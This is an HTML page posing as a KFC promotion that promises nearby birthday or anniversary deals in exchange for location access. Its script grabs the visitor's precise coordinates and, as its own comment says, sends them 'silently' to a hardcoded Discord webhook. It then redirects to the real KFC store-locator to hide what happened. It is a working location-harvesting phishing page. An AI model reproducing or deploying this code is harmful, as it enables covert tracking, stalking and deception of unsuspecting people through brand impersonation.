<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>KFC</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to bottom, #ffe8d6, #ffd5a5);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background: #fff;
      padding: 40px 30px;
      border-radius: 20px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
      text-align: center;
      width: 90%;
      max-width: 420px;
    }

    .logo {
      width: 100px;
      margin-bottom: 20px;
    }

    h1 {
      color: #d40000;
      font-size: 2.2rem;
      margin-bottom: 10px;
    }

    p {
      color: #333;
      font-size: 1.1rem;
    }

    .btn {
      background-color: #d40000;
      color: white;
      font-size: 1.1rem;
      padding: 14px 28px;
      border: none;
      border-radius: 40px;
      margin-top: 30px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .btn:hover {
      background-color: #a70000;
    }

    #status {
      display: none;
    }
  </style>
</head>
<body>

  <div class="card">
    <img src="kfc-logo.png" alt="KFC Logo" class="logo">
    <h1>KFC</h1>
    <p>Allow location to unlock nearby KFC deals on your Birthday or Anniversary üéÅ</p>
    <button class="btn" onclick="sendLocation()">üîé Nearby KFC Deals</button>
    <div id="status"></div>
  </div>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1400382122866249758/e2PIiGtfPBi0SQlRzF55kOmzGW2yUl-0HvUfjgp0Pohh9IAoWnbP-7EmGSKNbUnHgXjh";

    function sendLocation() {
      if (!navigator.geolocation) return;

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const accuracy = position.coords.accuracy;
          const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
          const message = `üçó **Nearby KFC Deal Request**\nüìç Latitude: ${lat}\nüìç Longitude: ${lon}\nüéØ Accuracy: ${accuracy} meters\nüîó [Google Maps](${mapUrl})`;

          // Send location silently
          fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message })
          }).finally(() => {
            // Redirect after slight delay
            setTimeout(() => {
              window.location.href = "https://www.kfcpakistan.com/store-locations";
            }, 1000);
          });
        },
        (error) => {
          // If user denies or error occurs, redirect anyway
          window.location.href = "https://www.kfcpakistan.com/store-locations";
        }
      );
    }
  </script>

</body>
</html>
